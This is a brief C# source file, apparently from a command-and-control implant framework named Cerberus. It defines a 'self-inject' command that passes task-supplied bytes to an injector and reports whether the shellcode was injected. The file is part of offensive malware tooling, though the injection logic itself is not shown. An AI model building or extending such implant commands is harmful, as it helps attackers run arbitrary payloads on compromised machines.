using Cerberus.Internal;
using Cerberus.Models.Tasks;

namespace Cerberus.Commands
{
    public class SelfInject : CerberusCommand
    {
        public override string Name => "self-inject";

        public override string Execute(CerberusTask task)
        {
            var injector = new SelfInjector();
            var success = injector.Inject(task.FileBytes);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}
